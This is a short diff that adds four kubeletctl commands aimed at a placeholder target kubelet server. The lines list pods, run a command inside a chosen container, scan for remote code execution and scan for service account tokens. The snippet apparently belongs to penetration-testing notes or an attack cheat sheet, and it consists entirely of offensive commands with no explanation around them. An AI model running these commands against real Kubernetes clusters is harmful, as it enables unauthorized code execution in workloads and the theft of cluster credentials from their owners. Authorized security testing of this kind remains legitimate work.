@@ -1,0 +1,4 @@
+kubeletctl pods --server "$TARGET"
+kubeletctl exec --server "$TARGET" --pod "$POD" --container "$CONTAINER" --cmd "id"
+kubeletctl scan rce --server "$TARGET"
+kubeletctl scan token --server "$TARGET"
